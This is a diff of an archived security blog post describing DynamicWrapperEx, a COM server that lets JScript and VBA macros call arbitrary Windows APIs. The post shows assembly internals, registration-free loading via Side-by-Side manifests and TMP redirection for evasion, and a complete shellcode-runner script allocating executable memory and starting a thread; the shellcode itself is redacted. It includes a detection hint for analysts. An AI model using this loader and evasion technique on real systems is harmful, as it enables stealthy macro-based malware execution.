+    jnz .stack_xmmx
+    mov r10, [rax + Argument.value]                 ; Decimal value
+    mov qword [rbx], r10                            ; Push value to the stack
+    jmp .next                                       ;
+.stack_xmmx:
+    movsd xmm5, [rax + Argument.value]              ; Floating pointer value
+    movsd [rbx], xmm5                               ; Push value to the stack
+    jmp .next                                       ;</pre>
+<p>Please note that a special check is required if the parameter is a floating point. Instructions and subsequently mnemonics to manipulate floating point registers and standard values/registers are not the same.</p>
 <p>If a parameter is passed via general purpose register (i.e. shadow stack), the position of the parameter dictates in which register the value needs to be moved into.</p>
+<pre class="prettyprint">.shadow_stack:
+    mov r10d, dword [dwArguments]                   ;
+    cmp r10d, 4h                                    ; 1st parameter
+    je .param4                                      ; 
+    cmp r10d, 3h                                    ; 2nd parameter
+    je .param3                                      ;
+    cmp r10d, 2h                                    ; 3rd parameter
+    je .param2                                      ;
+    cmp r10d, 1h                                    ; 4th parameter
+    je .param1                                      ;
+    jmp .failure                                    ; Something went wrong at this point</pre>
+<p>Once the register is known, it is important to check if this is a floating-point value before moving it. Again, this is because the mnemonics are not the same. Example with the first parameter:</p>
+<pre class="prettyprint">.param1:
+    and dword [rax + Argument.dwFlag], ARGUMENT_FLT
+    jnz .param1_xmmx
+    mov rcx, [rax + Argument.value]
+    jmp .next
+.param1_xmmx:
+    movsd xmm0, [rax + Argument.value]              ; floating point value 
+    jmp .next                                       ;</pre>
+<p>Once all parameters are properly setup, the routine calls the Windows API and moves the return value to a structure specifically created for it:</p>
+<pre class="prettyprint">mov rax, qword [lpFunction]          ; Address of the function
+    call rax                             ;
 
-    <pre class="prettyprint prettyprinted" style=""><span class="pun">.</span><span class="pln">shadow_stack</span><span class="pun">:</span><span class="pln">
-mov r10d</span><span class="pun">,</span><span class="pln"> dword </span><span class="pun">[</span><span class="pln">dwArguments</span><span class="pun">]</span><span class="pln">                   </span><span class="pun">;</span><span class="pln">
-cmp r10d</span><span class="pun">,</span><span class="pln"> </span><span class="lit">4h</span><span class="pln">                                    </span><span class="pun">;</span><span class="pln"> </span><span class="lit">1st</span><span class="pln"> parameter
-je </span><span class="pun">.</span><span class="pln">param4                                      </span><span class="pun">;</span><span class="pln"> 
-cmp r10d</span><span class="pun">,</span><span class="pln"> </span><span class="lit">3h</span><span class="pln">                                    </span><span class="pun">;</span><span class="pln"> </span><span class="lit">2nd</span><span class="pln"> parameter
-je </span><span class="pun">.</span><span class="pln">param3                                      </span><span class="pun">;</span><span class="pln">
-cmp r10d</span><span class="pun">,</span><span class="pln"> </span><span class="lit">2h</span><span class="pln">                                    </span><span class="pun">;</span><span class="pln"> </span><span class="lit">3rd</span><span class="pln"> parameter
-je </span><span class="pun">.</span><span class="pln">param2                                      </span><span class="pun">;</span><span class="pln">
-cmp r10d</span><span class="pun">,</span><span class="pln"> </span><span class="lit">1h</span><span class="pln">                                    </span><span class="pun">;</span><span class="pln"> </span><span class="lit">4th</span><span class="pln"> parameter
-je </span><span class="pun">.</span><span class="pln">param1                                      </span><span class="pun">;</span><span class="pln">
-jmp </span><span class="pun">.</span><span class="pln">failure                                    </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Something</span><span class="pln"> went wrong at </span><span class="kwd">this</span><span class="pln"> point</span></pre>
-
-    <p>Once the register is known, it is important to check if this is a floating-point value before moving it. Again, this is because the mnemonics are not the same. Example with the first parameter:</p>
-
-    <pre class="prettyprint prettyprinted" style=""><span class="pun">.</span><span class="pln">param1</span><span class="pun">:</span><span class="pln">
-</span><span class="kwd">and</span><span class="pln"> dword </span><span class="pun">[</span><span class="pln">rax </span><span class="pun">+</span><span class="pln"> </span><span class="typ">Argument</span><span class="pun">.</span><span class="pln">dwFlag</span><span class="pun">],</span><span class="pln"> ARGUMENT_FLT
-jnz </span><span class="pun">.</span><span class="pln">param1_xmmx
-mov rcx</span><span class="pun">,</span><span class="pln"> </span><span class="pun">[</span><span class="pln">rax </span><span class="pun">+</span><span class="pln"> </span><span class="typ">Argument</span><span class="pun">.</span><span class="kwd">value</span><span class="pun">]</span><span class="pln">
-jmp </span><span class="pun">.</span><span class="kwd">next</span><span class="pln">
-</span><span class="pun">.</span><span class="pln">param1_xmmx</span><span class="pun">:</span><span class="pln">
-movsd xmm0</span><span class="pun">,</span><span class="pln"> </span><span class="pun">[</span><span class="pln">rax </span><span class="pun">+</span><span class="pln"> </span><span class="typ">Argument</span><span class="pun">.</span><span class="kwd">value</span><span class="pun">]</span><span class="pln">              </span><span class="pun">;</span><span class="pln"> floating point </span><span class="kwd">value</span><span class="pln"> 
-jmp </span><span class="pun">.</span><span class="kwd">next</span><span class="pln">                                       </span><span class="pun">;</span></pre>
-
-    <p>Once all parameters are properly setup, the routine calls the Windows API and moves the return value to a structure specifically created for it:</p>
-
-    <pre class="prettyprint prettyprinted" style=""><span class="pln">mov rax</span><span class="pun">,</span><span class="pln"> qword </span><span class="pun">[</span><span class="pln">lpFunction</span><span class="pun">]</span><span class="pln">          </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Address</span><span class="pln"> of the </span><span class="kwd">function</span><span class="pln">
-call rax                             </span><span class="pun">;</span><span class="pln">
-
-mov rbx</span><span class="pun">,</span><span class="pln"> qword </span><span class="pun">[</span><span class="pln">lpResult</span><span class="pun">]</span><span class="pln">            </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Address</span><span class="pln"> of the RESULT </span><span class="kwd">union</span><span class="pln">
-</span><span class="kwd">and</span><span class="pln"> dword </span><span class="pun">[</span><span class="pln">dwReturnFlag</span><span class="pun">],</span><span class="pln"> RETURN_FLT </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Whether</span><span class="pln"> non</span><span class="pun">-</span><span class="pln">scalar </span><span class="kwd">return</span><span class="pln"> </span><span class="kwd">value</span><span class="pln">
-jnz </span><span class="pun">.</span><span class="pln">result_xmmx                     </span><span class="pun">;</span><span class="pln">
-mov qword </span><span class="pun">[</span><span class="pln">rbx</span><span class="pun">],</span><span class="pln"> rax                 </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Move</span><span class="pln"> scalar data
-jmp </span><span class="pun">.</span><span class="kwd">exit</span><span class="pln">                            </span><span class="pun">;</span><span class="pln">
-</span><span class="pun">.</span><span class="pln">result_xmmx</span><span class="pun">:</span><span class="pln">
-movsd </span><span class="pun">[</span><span class="pln">rbx</span><span class="pun">],</span><span class="pln"> xmm0                    </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Move</span><span class="pln"> non</span><span class="pun">-</span><span class="pln">scalar data
-jmp </span><span class="pun">.</span><span class="kwd">exit</span><span class="pln">                            </span><span class="pun">;</span></pre>
-
-    <p>The value is then returned all the way back to the script.</p>
-
-    <h2>Registration-Free Activation</h2>
-
-    <p>The final step is to load and activate the Automation server without having to register it.</p>
-
+    mov rbx, qword [lpResult]            ; Address of the RESULT union
+    and dword [dwReturnFlag], RETURN_FLT ; Whether non-scalar return value
+    jnz .result_xmmx                     ;
+    mov qword [rbx], rax                 ; Move scalar data
+    jmp .exit                            ;
+.result_xmmx:
+    movsd [rbx], xmm0                    ; Move non-scalar data
+    jmp .exit                            ;</pre>
+<p>The value is then returned all the way back to the script.</p>
+<h2>Registration-Free Activation</h2>
+<p>The final step is to load and activate the Automation server without having to register it.</p>
 <p>In a normal scenario when installing a COM component in a system, the component must export DllRegisterServer and DllUnregisterServer functions. To register the COM component, the function saves the class identifier (CLSID) of the component in the Windows Registry under HKEY_CLASS_ROOT\CLSID as well as the ProgID (aka friendly name) of the component under HKEY_CLASS_ROOT. To unregister the COM component, the function simply deletes the keys from the Windows Registry.</p>
-
 <p>Registration is important because when an application needs to load and use a component, it calls the CoCreateInstance Windows API with the CLSID of the component. This function then looks up the CLSID in the registry and reads the InprocServer32 sub-key. This key contains the path to the component in the system. If the CLSID is found, the function loads and maps the component in the private virtual memory of the process before calling the DllMain module entry point function.</p>
-
 <p>The following is an example with the RecordInfo COM component:</p>
-
-    <figure class="img-width-2-3">
-        <div class="modal-img-container">
-            <picture>
-                <!--[if IE 9]><video style="display: none;"><![endif]-->
-                <source srcset="/web/20210413192038im_/https://www.contextis.com/media/images/made/media/images/content/DWExPicture2_800_154_s_c1.png" media="(min-width: 768px)">
-                <!--[if IE 9]></video><![endif]-->
-                <img srcset="/web/20210413192038im_/https://www.contextis.com/media/images/made/media/images/content/DWExPicture2_800_154_s_c1.png" alt="">
-            </picture>
-            <div class="modal-hover">
-                <a class="modal-img hidden-xs" href="/web/20210413192038/https://www.contextis.com/media/images/content/DWExPicture2.png"></a>
-                <a class="modal-img visible-xs" href="/web/20210413192038/https://www.contextis.com/media/images/made/media/images/content/DWExPicture2_800_154.png"></a>
-            </div>
-        </div><!-- /modal-img-container -->
-   </figure>
-
-    <p>The problem with component registration is that it requires high integrity, such as local administrative privileges, on the system in order to manipulate the Windows Registry. It also leaves traces that should be considered from an operational security (OPSEC) point of view.</p>
-
-<p>However, &nbsp;Windows has a technology called Side-by-Side Assembly (SxS). SxS has been implemented in an attempt to address the “DLL hell” issue, also known as “dependency hell”. DLLs are designed by nature to share code for reusability purposes. The problem being that an application may have been designed with a specific version of a DLL, which may not be present on the system. Alternatively, the DLL may be present but is not the expected version.</p>
-
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source media="(min-width: 768px)" srcset="/blog/assets/media/DWExPicture2_800_154_s_c1.png"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/DWExPicture2_800_154_s_c1.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/web/20210413192038/https://www.contextis.com/media/images/content/DWExPicture2.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/DWExPicture2_800_154.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>The problem with component registration is that it requires high integrity, such as local administrative privileges, on the system in order to manipulate the Windows Registry. It also leaves traces that should be considered from an operational security (OPSEC) point of view.</p>
+<p>However,  Windows has a technology called Side-by-Side Assembly (SxS). SxS has been implemented in an attempt to address the “DLL hell” issue, also known as “dependency hell”. DLLs are designed by nature to share code for reusability purposes. The problem being that an application may have been designed with a specific version of a DLL, which may not be present on the system. Alternatively, the DLL may be present but is not the expected version.</p>
 <p>SxS addresses this problem by providing a set of APIs to query, install and uninstall assemblies from the SxS store. Do not confuse them with .NET Assemblies. The assembly from the SxS store is the name of a package of resources for unmanaged code, including – but not limited to – DLLs. The store is located under the “C:\Windows\WinSxS\” folder.</p>
-
 <p>Each assembly has an assembly manifest, which is an XML formatted file. This manifest represents the identity of the assembly, and contains various information about it such as the type, name, version, and dependencies.</p>
-
 <p>In order to use this technology, applications must create an Activation Context with the SxS APIs. The creation of this data structure requires an application manifest. Similar to an assembly manifest, this XML file lists all the required assemblies (e.g., DLL or COM components). When the application manifest is parsed, the assemblies are loaded and subsequently added to the Activation Context.</p>
-
 <p>An example of an application manifest file used to load <strong>DynamicWrapperEx</strong>:</p>
-
-    <pre class="prettyprint prettyprinted" style=""><span class="pun">&lt;?</span><span class="pln">xml version</span><span class="pun">=</span><span class="str">"1.0"</span><span class="pln"> encoding</span><span class="pun">=</span><span class="str">"UTF-16"</span><span class="pln"> standalone</span><span class="pun">=</span><span class="str">"yes"</span><span class="pun">?&gt;</span><span class="pln">
-</span><span class="tag">&lt;assembly</span><span class="pln"> </span><span class="atn">xmlns</span><span class="pun">=</span><span class="atv">"urn:schemas-microsoft-com:asm.v1"</span><span class="pln"> </span><span class="atn">manifestVersion</span><span class="pun">=</span><span class="atv">"1.0"</span><span class="tag">&gt;</span><span class="pln">
-</span><span class="tag">&lt;assemblyIdentity</span><span class="pln"> </span><span class="atn">type</span><span class="pun">=</span><span class="atv">"win32"</span><span class="pln"> </span><span class="atn">name</span><span class="pun">=</span><span class="atv">"DynamicWrapperEx v 1.0"</span><span class="pln"> </span><span class="atn">version</span><span class="pun">=</span><span class="atv">"1.0.0.0"</span><span class="pln"> </span><span class="tag">/&gt;</span><span class="pln">
-</span><span class="tag">&lt;file</span><span class="pln"> </span><span class="atn">name</span><span class="pun">=</span><span class="atv">"DynamicWrapperEx.dll"</span><span class="tag">&gt;</span><span class="pln">
-</span><span class="tag">&lt;comClass</span><span class="pln"> </span><span class="atn">description</span><span class="pun">=</span><span class="atv">"DynamicWrapperEx"</span><span class="pln"> </span><span class="atn">clsid</span><span class="pun">=</span><span class="atv">"{1E2F6CDD-E721-4E94-885C-36C95D6A8CC2}"</span><span class="pln"> </span><span class="atn">threadingModel</span><span class="pun">=</span><span class="atv">"Both"</span><span class="pln"> </span><span class="atn">progid</span><span class="pun">=</span><span class="atv">"DynamicWrapperEx"</span><span class="pln"> </span><span class="tag">/&gt;</span><span class="pln">
-</span><span class="tag">&lt;/file&gt;</span><span class="pln">
-</span><span class="tag">&lt;/assembly&gt;</span></pre>
-
-    <p>SxS first searches the assembly in the SxS store and then within the application folder (i.e. where the application manifest is located). The problem with the first step is that high integrity is required in order to write anything within the WinSxS folder. However, when creating an Activation Context instead of providing the path to the manifest file, it is possible to provide it as a hardcoded string. In this case, SxS searches in the folder defined by the TMP environment variable. This means that by controlling the TMP environment variable of a process, which does not require any specific privileges, it is also possible to control from where SxS will try to load the Automation server. This can be from any readable or writable location of the system.</p>
-
+<pre class="prettyprint">&lt;?xml version="1.0" encoding="UTF-16" standalone="yes"?&gt;
+&lt;assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"&gt;
+    &lt;assemblyIdentity type="win32" name="DynamicWrapperEx v 1.0" version="1.0.0.0" /&gt;
+    &lt;file name="DynamicWrapperEx.dll"&gt;
+        &lt;comClass description="DynamicWrapperEx" clsid="{1E2F6CDD-E721-4E94-885C-36C95D6A8CC2}" threadingModel="Both" progid="DynamicWrapperEx" /&gt;
+    &lt;/file&gt;
+&lt;/assembly&gt;</pre>
+<p>SxS first searches the assembly in the SxS store and then within the application folder (i.e. where the application manifest is located). The problem with the first step is that high integrity is required in order to write anything within the WinSxS folder. However, when creating an Activation Context instead of providing the path to the manifest file, it is possible to provide it as a hardcoded string. In this case, SxS searches in the folder defined by the TMP environment variable. This means that by controlling the TMP environment variable of a process, which does not require any specific privileges, it is also possible to control from where SxS will try to load the Automation server. This can be from any readable or writable location of the system.</p>
 <p>The following screenshot shows how the SysInternals process monitor tool records the event of a process accessing the Automation server located in the TMP directory.</p>
-
-    <figure class="img-width-2-3">
-        <div class="modal-img-container">
-            <picture>
-                <!--[if IE 9]><video style="display: none;"><![endif]-->
-                <source srcset="/web/20210413192038im_/https://www.contextis.com/media/images/made/media/images/content/DWExPicture3_800_125_s_c1.png" media="(min-width: 768px)">
-                <!--[if IE 9]></video><![endif]-->
-                <img srcset="/web/20210413192038im_/https://www.contextis.com/media/images/made/media/images/content/DWExPicture3_800_125_s_c1.png" alt="">
-            </picture>
-            <div class="modal-hover">
-                <a class="modal-img hidden-xs" href="/web/20210413192038/https://www.contextis.com/media/images/content/DWExPicture3.png"></a>
-                <a class="modal-img visible-xs" href="/web/20210413192038/https://www.contextis.com/media/images/made/media/images/content/DWExPicture3_800_125.png"></a>
-            </div>
-        </div><!-- /modal-img-container -->
-   </figure>
-
-    <p>Finally, from a scripting language it is possible to create a new activation context via the <strong>Microsoft.Windows.Actctx</strong> COM component. This means that from VBA or JScript, an Activation Context can be created with an application manifest in order to load the Automation server. This avoids the need to register the Automation server.</p>
-
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source media="(min-width: 768px)" srcset="/blog/assets/media/DWExPicture3_800_125_s_c1.png"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/DWExPicture3_800_125_s_c1.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/web/20210413192038/https://www.contextis.com/media/images/content/DWExPicture3.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/DWExPicture3_800_125.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>Finally, from a scripting language it is possible to create a new activation context via the <strong>Microsoft.Windows.Actctx</strong> COM component. This means that from VBA or JScript, an Activation Context can be created with an application manifest in order to load the Automation server. This avoids the need to register the Automation server.</p>
 <p>The following code snippet demonstrates how to load the Automation server in JScript:</p>
+<pre class="prettyprint">var manifestXML = '&lt;?xml version="1.0" encoding="UTF-16" standalone="yes"?&gt;&lt;assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"&gt;&lt;assemblyIdentity type="win32" name="COM" version="1.0.0.0"/&gt; &lt;file name="DynamicWrapperEx.dll"&gt; &lt;comClass description="DynamicWrapperEx" clsid="{1E2F6CDD-E721-4E94-885C-36C95D6A8CC2}" threadingModel="Both" progid="DynamicWrapperEx"/&gt;&lt;/file&gt;&lt;/assembly&gt;'
+ 
+var s = new ActiveXObject('WScript.Shell')
+s.Environment('Process')('TMP') = '&lt;somewhere read/writable&gt;';
+ 
+var actCtx = new ActiveXObject("Microsoft.Windows.ActCtx");
+actCtx.ManifestText = manifestXML;
 
-    <pre class="prettyprint prettyprinted" style=""><span class="kwd">var</span><span class="pln"> manifestXML </span><span class="pun">=</span><span class="pln"> </span><span class="str">'&lt;?xml version="1.0" encoding="UTF-16" standalone="yes"?&gt;&lt;assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"&gt;&lt;assemblyIdentity type="win32" name="COM" version="1.0.0.0"/&gt; &lt;file name="DynamicWrapperEx.dll"&gt; &lt;comClass description="DynamicWrapperEx" clsid="{1E2F6CDD-E721-4E94-885C-36C95D6A8CC2}" threadingModel="Both" progid="DynamicWrapperEx"/&gt;&lt;/file&gt;&lt;/assembly&gt;'</span><span class="pln">
+var dwx = actCtx.CreateObject("DynamicWrapperEx");
 
-</span><span class="kwd">var</span><span class="pln"> s </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">ActiveXObject</span><span class="pun">(</span><span class="str">'WScript.Shell'</span><span class="pun">)</span><span class="pln">
-s</span><span class="pun">.</span><span class="typ">Environment</span><span class="pun">(</span><span class="str">'Process'</span><span class="pun">)(</span><span class="str">'TMP'</span><span class="pun">)</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="str">'&lt;somewhere read/writable&gt;'</span><span class="pun">;</span><span class="pln">
+While this one shows how to do it in VBA:
+Sub Activation()
+    Dim manifest As String
+    manifest = "&lt;?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?&gt;&lt;assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0""&gt;&lt;assemblyIdentity type=""win32"" name=""DynamicWrapperEx"" version=""1.0.0.0""/&gt; &lt;file name=""DynamicWrapperEx.dll""&gt; &lt;comClass description=""DynamicWrapperEx"" clsid=""{1E2F6CDD-E721-4E94-885C-36C95D6A8CC2}"" threadingModel=""Both"" progid=""DynamicWrapperEx""/&gt;&lt;/file&gt;&lt;/assembly&gt;"
+ 
+    ' Change TMP Environment variable
+    Dim env As Object
+    Set env = CreateObject("WScript.Shell")
+    env.Environment("Process").Item("TMP") = "&lt;somewhere read/writable&gt;”
 
-</span><span class="kwd">var</span><span class="pln"> actCtx </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">ActiveXObject</span><span class="pun">(</span><span class="str">"Microsoft.Windows.ActCtx"</span><span class="pun">);</span><span class="pln">
-actCtx</span><span class="pun">.</span><span class="typ">ManifestText</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> manifestXML</span><span class="pun">;</span><span class="pln">
-
-</span><span class="kwd">var</span><span class="pln"> dwx </span><span class="pun">=</span><span class="pln"> actCtx</span><span class="pun">.</span><span class="typ">CreateObject</span><span class="pun">(</span><span class="str">"DynamicWrapperEx"</span><span class="pun">);</span><span class="pln">
-
-</span><span class="typ">While</span><span class="pln"> </span><span class="kwd">this</span><span class="pln"> one shows how to </span><span class="kwd">do</span><span class="pln"> it </span><span class="kwd">in</span><span class="pln"> VBA</span><span class="pun">:</span><span class="pln">
-</span><span class="typ">Sub</span><span class="pln"> </span><span class="typ">Activation</span><span class="pun">()</span><span class="pln">
-</span><span class="typ">Dim</span><span class="pln"> manifest </span><span class="typ">As</span><span class="pln"> </span><span class="typ">String</span><span class="pln">
-manifest </span><span class="pun">=</span><span class="pln"> </span><span class="str">"&lt;?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?&gt;&lt;assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0""&gt;&lt;assemblyIdentity type=""win32"" name=""DynamicWrapperEx"" version=""1.0.0.0""/&gt; &lt;file name=""DynamicWrapperEx.dll""&gt; &lt;comClass description=""DynamicWrapperEx"" clsid=""{1E2F6CDD-E721-4E94-885C-36C95D6A8CC2}"" threadingModel=""Both"" progid=""DynamicWrapperEx""/&gt;&lt;/file&gt;&lt;/assembly&gt;"</span><span class="pln">
-
-</span><span class="str">' Change TMP Environment variable
-Dim env As Object
-Set env = CreateObject("WScript.Shell")
-env.Environment("Process").Item("TMP") = "&lt;somewhere read/writable&gt;”
-
-'</span><span class="pln"> </span><span class="typ">Create</span><span class="pln"> </span><span class="typ">ActivationContext</span><span class="pln">
-</span><span class="typ">Dim</span><span class="pln"> dwx </span><span class="typ">As</span><span class="pln"> </span><span class="typ">Object</span><span class="pln">
-</span><span class="typ">Set</span><span class="pln"> dwx </span><span class="pun">=</span><span class="pln"> </span><span class="typ">CreateObject</span><span class="pun">(</span><span class="str">"Microsoft.Windows.ActCtx"</span><span class="pun">)</span><span class="pln">
-dwx</span><span class="pun">.</span><span class="typ">ManifestText</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> manifest
-
-</span><span class="str">' Create Automation server
-Dim server As Object
-Set server = dwx.CreateObject("DynamicWrapperEx")
-End Sub</span></pre>
-
-    <p>To summarise, by using the <strong>Microsoft.Windows.Actctx</strong> COM component it is possible to load the Automation server without registration. Additionally, the location in which SxS will search for the Automation server, can be easily controlled via the TMP environment variable of a process.</p>
-
-    <h2>Limitations and Operational Security Considerations</h2>
-
-    <p>Because of the use of VARIANT structures to pass parameters, Windows API functions that require structures of more than 8 bytes length cannot be used. The same happens if the Windows API returns a structure of more than 8 bytes. To address this issue, the developer can write static methods that will aggregate multiple Windows APIs. By doing so, this allows for full control over which Windows API can be used.</p>
-
+    ' Create ActivationContext
+    Dim dwx As Object
+    Set dwx = CreateObject("Microsoft.Windows.ActCtx")
+    dwx.ManifestText = manifest
+    
+    ' Create Automation server
+    Dim server As Object
+    Set server = dwx.CreateObject("DynamicWrapperEx")
+End Sub</pre>
+<p>To summarise, by using the <strong>Microsoft.Windows.Actctx</strong> COM component it is possible to load the Automation server without registration. Additionally, the location in which SxS will search for the Automation server, can be easily controlled via the TMP environment variable of a process.</p>
+<h2>Limitations and Operational Security Considerations</h2>
+<p>Because of the use of VARIANT structures to pass parameters, Windows API functions that require structures of more than 8 bytes length cannot be used. The same happens if the Windows API returns a structure of more than 8 bytes. To address this issue, the developer can write static methods that will aggregate multiple Windows APIs. By doing so, this allows for full control over which Windows API can be used.</p>
 <p>Even if the Automation server can be used without registration (i.e., does not modify the Windows Registry), the DLL must be accessible. The location of the Automation server can be either local on the system or remote over SMB or WebDAV. In any case, if the Automation server contains known signatures (e.g., hard-coded shellcode), this one will most likely be detected by Anti-Virus software.</p>
-
 <p>Finally, analysts should be aware that side-by-side assembly technology is rarely used today, since Visual C++ 2010. Additionally, SxS is commonly used by C/C++ Windows applications and not via VBA or JScript. Therefore, the use of the <strong>Microsoft.Windows.Actctx</strong> COM component via a VBA Macro or JScript is most likely used for malicious purposes.</p>
+<h2>Example of Shellcode Execution</h2>
+<p>The following example shows how to execute shellcode from JScript. Please note that the code expects the Automation server to already be present on the system.</p>
+<pre class="prettyprint">var manifestXML = '&lt;?xml version="1.0" encoding="UTF-16" standalone="yes"?&gt;&lt;assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"&gt;&lt;assemblyIdentity type="win32" name="COM" version="1.0.0.0"/&gt; &lt;file name="DynamicWrapperEx.dll"&gt; &lt;comClass description="DynamicWrapperEx" clsid="{1E2F6CDD-E721-4E94-885C-36C95D6A8CC2}" threadingModel="Both" progid="DynamicWrapperEx"/&gt;&lt;/file&gt;&lt;/assembly&gt;'
+ 
+var s = new ActiveXObject('WScript.Shell')
+s.Environment('Process')('TMP') = '&lt;read/writable folder&gt;';
+ 
+var actCtx = new ActiveXObject("Microsoft.Windows.ActCtx");
+actCtx.ManifestText = manifestXML;
 
-    <h2>Example of Shellcode Execution</h2>
+//-------------------------------------------------------------------------------------------------
+// Function registration
+//-------------------------------------------------------------------------------------------------
+var dwx = actCtx.CreateObject("DynamicWrapperEx");
+try {
+    dwx.DwRegister("kernel32.dll", "VirtualAlloc");
+    dwx.DwRegister("kernel32.dll", "CreateThread");
+    dwx.DwRegister("kernel32.dll", "WaitForSingleObject");
+} catch (e) {
+    WScript.Echo(e.message)
+}
 
-    <p>The following example shows how to execute shellcode from JScript. Please note that the code expects the Automation server to already be present on the system.</p>
+//-------------------------------------------------------------------------------------------------
+// Execute shellcode
+//-------------------------------------------------------------------------------------------------
+var commit = 0x00003000;
+var guard = 0x40; 
 
-    <pre class="prettyprint prettyprinted" style=""><span class="kwd">var</span><span class="pln"> manifestXML </span><span class="pun">=</span><span class="pln"> </span><span class="str">'&lt;?xml version="1.0" encoding="UTF-16" standalone="yes"?&gt;&lt;assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"&gt;&lt;assemblyIdentity type="win32" name="COM" version="1.0.0.0"/&gt; &lt;file name="DynamicWrapperEx.dll"&gt; &lt;comClass description="DynamicWrapperEx" clsid="{1E2F6CDD-E721-4E94-885C-36C95D6A8CC2}" threadingModel="Both" progid="DynamicWrapperEx"/&gt;&lt;/file&gt;&lt;/assembly&gt;'</span><span class="pln">
+var shellcode = [
+	// redacted 
+];
+var lpAddress = dwx.VirtualAlloc(0, shellcode.length, commit, guard);
+if (lpAddress == 0) {
+    WScript.Quit();
+}
 
-</span><span class="kwd">var</span><span class="pln"> s </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">ActiveXObject</span><span class="pun">(</span><span class="str">'WScript.Shell'</span><span class="pun">)</span><span class="pln">
-s</span><span class="pun">.</span><span class="typ">Environment</span><span class="pun">(</span><span class="str">'Process'</span><span class="pun">)(</span><span class="str">'TMP'</span><span class="pun">)</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="str">'&lt;read/writable folder&gt;'</span><span class="pun">;</span><span class="pln">
+for (var i = 0; i &lt; shellcode.length; ++i) {
+    dwx.WriteByte(shellcode&lt;i&gt;, lpAddress, i);
+}
 
-</span><span class="kwd">var</span><span class="pln"> actCtx </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">ActiveXObject</span><span class="pun">(</span><span class="str">"Microsoft.Windows.ActCtx"</span><span class="pun">);</span><span class="pln">
-actCtx</span><span class="pun">.</span><span class="typ">ManifestText</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> manifestXML</span><span class="pun">;</span><span class="pln">
+var hThread = dwx.CreateThread(null, 0, lpAddress, null, 0, 0);
+if (hThread == 0) {
+    WScript.Quit();
+}
+dwx.WaitForSingleObject(hThread, 10000);</pre>
+<p>Same example as above but with Visual Basic for Application (VBA).</p>
+<pre class="prettyprint">Sub Activation()
+    Dim manifest As String
+    manifest = "&lt;?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?&gt;&lt;assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0""&gt;&lt;assemblyIdentity type=""win32"" name=""DynamicWrapperEx"" version=""1.0.0.0""/&gt; &lt;file name=""DynamicWrapperEx.dll""&gt; &lt;comClass description=""DynamicWrapperEx"" clsid=""{1E2F6CDD-E721-4E94-885C-36C95D6A8CC2}"" threadingModel=""Both"" progid=""DynamicWrapperEx""/&gt;&lt;/file&gt;&lt;/assembly&gt;"
+ 
+    ' Change TMP Environment variable
+    Dim env As Object
+    Set env = CreateObject("WScript.Shell")
+    env.Environment("Process").Item("TMP") = "&lt;read/writable folder&gt;"
 
-</span><span class="com">//-------------------------------------------------------------------------------------------------</span><span class="pln">
-</span><span class="com">// Function registration</span><span class="pln">
-</span><span class="com">//-------------------------------------------------------------------------------------------------</span><span class="pln">
-</span><span class="kwd">var</span><span class="pln"> dwx </span><span class="pun">=</span><span class="pln"> actCtx</span><span class="pun">.</span><span class="typ">CreateObject</span><span class="pun">(</span><span class="str">"DynamicWrapperEx"</span><span class="pun">);</span><span class="pln">
-</span><span class="kwd">try</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
-dwx</span><span class="pun">.</span><span class="typ">DwRegister</span><span class="pun">(</span><span class="str">"kernel32.dll"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"VirtualAlloc"</span><span class="pun">);</span><span class="pln">
-dwx</span><span class="pun">.</span><span class="typ">DwRegister</span><span class="pun">(</span><span class="str">"kernel32.dll"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"CreateThread"</span><span class="pun">);</span><span class="pln">
-dwx</span><span class="pun">.</span><span class="typ">DwRegister</span><span class="pun">(</span><span class="str">"kernel32.dll"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"WaitForSingleObject"</span><span class="pun">);</span><span class="pln">
